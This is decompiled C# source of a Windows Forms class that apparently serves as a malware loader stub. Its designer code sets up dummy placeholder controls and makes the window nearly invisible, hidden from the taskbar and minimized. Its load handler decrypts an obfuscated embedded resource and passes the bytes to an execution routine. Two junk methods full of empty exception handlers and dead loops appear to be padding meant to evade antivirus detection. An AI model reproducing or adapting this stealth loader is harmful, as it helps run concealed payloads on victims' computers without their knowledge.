using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace RW;

[DesignerGenerated]
public class R1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Button1")]
	private Button button_0;

	[AccessedThroughProperty("Button2")]
	private Button button_1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox checkBox_0;

	[AccessedThroughProperty("Label1")]
	private Label label_0;

	[AccessedThroughProperty("Label2")]
	private Label label_1;

	[AccessedThroughProperty("Label3")]
	private Label label_2;

	[AccessedThroughProperty("Label4")]
	private Label label_3;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel linkLabel_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox pictureBox_1;

	[AccessedThroughProperty("PictureBox3")]
	private PictureBox pictureBox_2;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar progressBar_0;

	public R1()
	{
		((Form)this).add_Load((EventHandler)R1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_06e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ed: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(R1));
		vmethod_1(new Button());
		vmethod_3(new Button());
		vmethod_5(new CheckBox());
		vmethod_7(new Label());
		vmethod_9(new Label());
		vmethod_11(new Label());
		vmethod_13(new Label());
		vmethod_15(new LinkLabel());
		vmethod_17(new TextBox());
		vmethod_19(new PictureBox());
		vmethod_21(new PictureBox());
		vmethod_23(new PictureBox());
		vmethod_25(new ProgressBar());
		((ISupportInitialize)vmethod_18()).BeginInit();
		((ISupportInitialize)vmethod_20()).BeginInit();
		((ISupportInitialize)vmethod_22()).BeginInit();
		((Control)this).SuspendLayout();
		Button obj = vmethod_0();
		Point location = new Point(43, 45);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("Button1");
		Button obj2 = vmethod_0();
		Size size = new Size(75, 23);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		((ButtonBase)vmethod_0()).set_Text("Button1");
		((ButtonBase)vmethod_0()).set_UseVisualStyleBackColor(true);
		Button obj3 = vmethod_2();
		location = new Point(187, 13);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("Button2");
		Button obj4 = vmethod_2();
		size = new Size(75, 23);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(1);
		((ButtonBase)vmethod_2()).set_Text("Button2");
		((ButtonBase)vmethod_2()).set_UseVisualStyleBackColor(true);
		((ButtonBase)vmethod_4()).set_AutoSize(true);
		CheckBox obj5 = vmethod_4();
		location = new Point(226, 94);
		((Control)obj5).set_Location(location);
		((Control)vmethod_4()).set_Name("CheckBox1");
		CheckBox obj6 = vmethod_4();
		size = new Size(81, 17);
		((Control)obj6).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(2);
		((ButtonBase)vmethod_4()).set_Text("CheckBox1");
		((ButtonBase)vmethod_4()).set_UseVisualStyleBackColor(true);
		vmethod_6().set_AutoSize(true);
		Label obj7 = vmethod_6();
		location = new Point(13, 94);
		((Control)obj7).set_Location(location);
		((Control)vmethod_6()).set_Name("Label1");
		Label obj8 = vmethod_6();
		size = new Size(39, 13);
		((Control)obj8).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(3);
		vmethod_6().set_Text("Label1");
		vmethod_8().set_AutoSize(true);
		Label obj9 = vmethod_8();
		location = new Point(162, 61);
		((Control)obj9).set_Location(location);
		((Control)vmethod_8()).set_Name("Label2");
		Label obj10 = vmethod_8();
		size = new Size(39, 13);
		((Control)obj10).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(4);
		vmethod_8().set_Text("Label2");
		vmethod_10().set_AutoSize(true);
		Label obj11 = vmethod_10();
		location = new Point(222, 118);
		((Control)obj11).set_Location(location);
		((Control)vmethod_10()).set_Name("Label3");
		Label obj12 = vmethod_10();
		size = new Size(39, 13);
		((Control)obj12).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(5);
		vmethod_10().set_Text("Label3");
		vmethod_12().set_AutoSize(true);
		Label obj13 = vmethod_12();
		location = new Point(78, 118);
		((Control)obj13).set_Location(location);
		((Control)vmethod_12()).set_Name("Label4");
		Label obj14 = vmethod_12();
		size = new Size(39, 13);
		((Control)obj14).set_Size(size);
		((Control)vmethod_12()).set_TabIndex(6);
		vmethod_12().set_Text("Label4");
		((Label)vmethod_14()).set_AutoSize(true);
		LinkLabel obj15 = vmethod_14();
		location = new Point(58, 93);
		((Control)obj15).set_Location(location);
		((Control)vmethod_14()).set_Name("LinkLabel1");
		LinkLabel obj16 = vmethod_14();
		size = new Size(59, 13);
		((Control)obj16).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(7);
		((Label)vmethod_14()).set_TabStop(true);
		vmethod_14().set_Text("LinkLabel1");
		TextBox obj17 = vmethod_16();
		location = new Point(61, 204);
		((Control)obj17).set_Location(location);
		((Control)vmethod_16()).set_Name("TextBox1");
		TextBox obj18 = vmethod_16();
		size = new Size(100, 20);
		((Control)obj18).set_Size(size);
		((Control)vmethod_16()).set_TabIndex(8);
		PictureBox obj19 = vmethod_18();
		location = new Point(189, 147);
		((Control)obj19).set_Location(location);
		((Control)vmethod_18()).set_Name("PictureBox1");
		PictureBox obj20 = vmethod_18();
		size = new Size(100, 50);
		((Control)obj20).set_Size(size);
		vmethod_18().set_TabIndex(9);
		vmethod_18().set_TabStop(false);
		PictureBox obj21 = vmethod_20();
		location = new Point(25, 24);
		((Control)obj21).set_Location(location);
		((Control)vmethod_20()).set_Name("PictureBox2");
		PictureBox obj22 = vmethod_20();
		size = new Size(100, 50);
		((Control)obj22).set_Size(size);
		vmethod_20().set_TabIndex(10);
		vmethod_20().set_TabStop(false);
		PictureBox obj23 = vmethod_22();
		location = new Point(94, 147);
		((Control)obj23).set_Location(location);
		((Control)vmethod_22()).set_Name("PictureBox3");
		PictureBox obj24 = vmethod_22();
		size = new Size(100, 50);
		((Control)obj24).set_Size(size);
		vmethod_22().set_TabIndex(11);
		vmethod_22().set_TabStop(false);
		ProgressBar obj25 = vmethod_24();
		location = new Point(165, 227);
		((Control)obj25).set_Location(location);
		((Control)vmethod_24()).set_Name("ProgressBar1");
		ProgressBar obj26 = vmethod_24();
		size = new Size(100, 23);
		((Control)obj26).set_Size(size);
		((Control)vmethod_24()).set_TabIndex(12);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(134, 16);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_24());
		((Control)this).get_Controls().Add((Control)(object)vmethod_22());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_18());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("R1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)vmethod_18()).EndInit();
		((ISupportInitialize)vmethod_20()).EndInit();
		((ISupportInitialize)vmethod_22()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button vmethod_0()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(Button WithEventsValue)
	{
		button_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Button vmethod_2()
	{
		return button_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Button WithEventsValue)
	{
		button_1 = WithEventsValue;
	}

	[SpecialName]
	internal virtual CheckBox vmethod_4()
	{
		return checkBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(CheckBox WithEventsValue)
	{
		checkBox_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Label vmethod_6()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(Label WithEventsValue)
	{
		label_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Label vmethod_8()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(Label WithEventsValue)
	{
		label_1 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Label vmethod_10()
	{
		return label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Label WithEventsValue)
	{
		label_2 = WithEventsValue;
	}

	[SpecialName]
	internal virtual Label vmethod_12()
	{
		return label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(Label WithEventsValue)
	{
		label_3 = WithEventsValue;
	}

	[SpecialName]
	internal virtual LinkLabel vmethod_14()
	{
		return linkLabel_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(LinkLabel WithEventsValue)
	{
		linkLabel_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual TextBox vmethod_16()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_17(TextBox WithEventsValue)
	{
		textBox_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_18()
	{
		return pictureBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_19(PictureBox WithEventsValue)
	{
		pictureBox_0 = WithEventsValue;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_20()
	{
		return pictureBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_21(PictureBox WithEventsValue)
	{
		pictureBox_1 = WithEventsValue;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_22()
	{
		return pictureBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_23(PictureBox WithEventsValue)
	{
		pictureBox_2 = WithEventsValue;
	}

	[SpecialName]
	internal virtual ProgressBar vmethod_24()
	{
		return progressBar_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_25(ProgressBar WithEventsValue)
	{
		progressBar_0 = WithEventsValue;
	}

	public void Gr0wlit_TDDSs4LO0dMbJg()
	{
		new decimal(1004377783L);
		while (true)
		{
		}
	}

	public void Gr0wlit_SG1DiMxk()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		double num = 0.1919225;
		do
		{
			try
			{
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			num += 1.0;
		}
		while (num <= 0.6789134);
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		for (double num2 = 0.08989656; !(num2 > 0.03095061); num2 += 1.0)
		{
			try
			{
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void R1_Load(object sender, EventArgs e)
	{
		byte[] byte_ = Po.O(Conversions.ToString(Class6.object_0[18]), Conversions.ToString(Class6.object_0[1]), 88);
		Class6.smethod_0(byte_, "A");
	}
}
